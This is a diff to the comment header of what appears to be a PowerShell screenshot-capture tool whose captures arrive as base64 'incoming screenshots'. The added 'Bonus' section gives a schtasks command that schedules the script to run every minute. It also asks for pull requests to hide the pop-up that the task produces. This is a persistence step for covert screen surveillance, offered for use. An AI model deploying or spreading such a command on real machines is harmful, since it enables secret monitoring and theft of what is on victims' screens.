@@ -6,6 +6,11 @@
    
    Your incoming screenshots are bmp files and base64 encoded. Copy the payload and paste them on this site:   https://base64.guru/converter/decode/image/bmp 
    or google something like "bmp base64 decode". Everything has an online tool now... 
+   
+   ---------- Bonus ----------
+   Bonus points for making a screenshot every minute:
+   cmd /k "schtasks /create /tn 'screenshot' /tr %PUBLIC%\screenshot.ps1 /sc minute /mo 1" 
+   Please note that this might pop-up every minute, pull requests welcome to make a fix for this. 
 #>
 
 $File = "$Env:PUBLIC\Screenshot1.bmp" 
